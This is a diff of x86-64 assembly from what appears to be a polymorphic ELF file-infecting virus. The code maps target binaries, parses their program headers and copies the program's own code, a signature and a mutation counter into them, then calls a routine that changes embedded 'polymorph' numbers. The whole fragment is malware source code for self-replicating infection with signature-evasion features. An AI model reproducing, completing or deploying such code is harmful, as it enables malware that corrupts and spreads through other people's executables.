@@ -42,12 +42,6 @@ _update_mmaped_file: ; update_mmaped_file(void *mmap_base_address, long file_siz
 
 	mov QWORD [rsp + 376], r11
 
-	mov rax, SYS_WRITE
-	mov rdi, 1
-	lea rsi, [rsp + 376]
-	mov rdx, 8
-	syscall
-
 	mov QWORD [rsp + 124], 0
 
 ; init phdr (ehdr + ehdr->e_phoff)
@@ -340,7 +334,41 @@ _write_in_tmp_map:
 _copy_start_point:
 	mov rdi, QWORD [rsp + 108]
 	add rdi, QWORD [rsp + 116]
-	lea rsi, [rel _string]
+	lea rsi, [rel _string.signature]
+	lea rcx, [rel _string.code]
+;	sub rcx, 8
+	sub rcx, rsi
+	add QWORD [rsp + 116], rcx ; add 8 to our index
+	cld
+	rep movsb
+
+	; rsp + 376 code_inc
+	mov rdi, QWORD [rsp + 108]
+	add rdi, QWORD [rsp + 116]
+	lea rsi, [rel _string.code]
+	mov rcx, 8
+	add QWORD [rsp + 116], rcx ; add 8 to our index
+	cld
+	rep movsb
+
+	mov rdi, QWORD [rsp + 108]
+	add rdi, QWORD [rsp + 116]
+	sub rdi, 8
+	xor rsi, rsi
+	mov si, WORD [rsp + 378]
+	call _update_polymorph_number
+
+	mov rdi, QWORD [rsp + 108]
+	add rdi, QWORD [rsp + 116]
+	sub rdi, 4
+	xor rsi, rsi
+	mov si, WORD [rsp + 376]
+	call _update_polymorph_number
+
+	mov rdi, QWORD [rsp + 108]
+	add rdi, QWORD [rsp + 116]
+	lea rsi, [rel _start]
+	sub rsi, 1
 	lea rcx, [rel _checkproc]
 	sub rcx, 8
 	sub rcx, rsi
